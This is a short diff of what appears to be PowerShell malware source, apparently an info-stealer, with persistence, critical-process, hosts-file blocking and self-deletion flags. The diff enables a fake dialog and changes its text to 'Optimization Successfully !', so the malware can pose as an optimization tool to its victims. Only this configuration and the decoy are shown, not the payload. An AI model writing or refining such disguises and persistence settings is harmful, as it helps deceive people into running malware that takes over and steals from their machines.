@@ -3,7 +3,7 @@ $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
-$fakeerror = $false
+$fakeerror = $true
 $persistence = $true
 
 if ($debug) {
@@ -22,7 +22,7 @@ Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http,
 
 function KDMUTEX {
     if ($fakeerror) {
-        [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
+        [Windows.Forms.MessageBox]::Show("Optimization Successfully !", '', 'OK', 'Error')
     }
     $AppId = "f8f13feb-1149-4dd5-bed5-5bcf4efc2f9b"
     $CreatedNew = $false
